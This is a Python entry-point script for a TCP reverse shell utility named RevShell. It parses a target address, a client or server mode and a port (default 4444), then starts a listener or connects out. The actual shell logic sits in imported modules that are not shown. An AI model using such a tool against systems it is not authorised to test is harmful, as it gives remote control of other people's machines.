#!/usr/bin/python3
import argparse

from multi import utils
from multi.nodes.server import Server
from multi.nodes.client import Client

parser = argparse.ArgumentParser(
    prog="revshell",
    description="RevShell: Python3 TCP reverse shell utility",
    usage="revshell [-h] [-v] [-d] [-m MODE] [-p PORT] [target]"
)

parser.add_argument("target", type=str, nargs="?", help="target IPv4 address")
parser.add_argument("-m", "--mode", type=str, help="operation mode [client|server]")
parser.add_argument("-p", "--port", type=int, help="port to use as TCP socket")
parser.add_argument("-v", "--verbose", action="store_true", help="verbose output")
parser.add_argument("-d", "--debug", action="store_true", help="very verbose output")

args = parser.parse_args()

target: str = args.target
verbose: bool = args.verbose
debug: bool = args.debug
mode: str = args.mode
port: int = args.port

if __name__ == "__main__":
    if (target is None) & (mode is None):
        msg = "one or both of the following arguments are required: "
        parser.error(msg + "target, -m/--mode")
        exit(1)

    utils.init_colorama()

    if mode is not None:
        if mode.lower() not in ["client", "server"]:
            utils.throw("Expected <mode> to be [client|server]")
    else:
        mode = "client"

    if verbose:
        utils.status(f"mode => {mode.lower()}")

    if (target is None) & (mode.lower() == "client"):
        utils.throw("Value for [target] can't be None in client mode")

    if target is not None:
        if not utils.ipv4_parse(target):
            utils.throw("Value for [target] is not a valid IPv4 address")
    else:
        target = "0.0.0.0"

    if verbose:
        utils.status(f"target => {target}")

    if port is not None:
        try:
            if not 1 <= int(port) <= 65535:
                raise ValueError()
        except ValueError:
            utils.throw("Value for [port] must be [1 <= port <= 65535]")
    else:
        port = 4444

    if verbose:
        utils.status(f"port => {port}")

    if mode == "server":
        handler = Server(target, port, verbose, debug)
        handler.listen()
    else:
        handler = Client(target, port, verbose, debug)
        handler.connect()
